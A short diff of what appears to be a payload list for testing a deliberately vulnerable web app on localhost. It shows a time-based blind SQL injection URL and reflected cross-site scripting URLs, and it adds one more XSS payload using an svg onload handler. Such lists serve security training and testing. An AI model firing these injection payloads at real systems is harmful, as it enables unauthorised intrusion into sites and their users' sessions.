@@ -19,6 +19,7 @@ http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27+AND+SLEEP%285%29--+-&S
 ========================================
 http://localhost:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
 http://localhost:8080/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
+http://localhost:8080/vulnerabilities/xss_r/?name=%3Csvg+onload%3Dalert%281%29%3E
 
 ========================================
 4) XSS Stored (POST)
